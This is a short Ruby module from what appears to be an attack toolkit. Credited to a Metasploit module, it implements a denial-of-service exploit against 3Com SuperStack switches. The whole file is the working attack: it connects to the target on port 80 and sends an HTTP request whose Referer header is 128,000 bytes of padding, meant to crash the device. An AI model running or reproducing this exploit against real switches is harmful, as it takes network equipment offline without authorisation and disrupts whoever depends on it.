
def tcom_ssswitch_dos_load(opt)
	opt["host"] = true
	return opt
end

def tcom_ssswitch_dos(opt)
	# 3Com SuperStack Switch DoS
	# Based on 3com_superstack_switch.rb from MSF
	buff = "A"*128000
	host = opt["host"]

	puts "#{HC}#{FYEL}Connecting to the target ..."
	begin
		s = TCPSocket.new(host, 80)
	rescue
		puts "#{HC}#{FYEL}Failed connection..."
		return 0
	end
	puts "#{HC}#{FYEL}Connected! sending exploit ..."
	s.write("GET / HTTP/1.0\r\nReferer: #{buff}\r\n\r\n")
	s.close()
	puts "Done...."
end

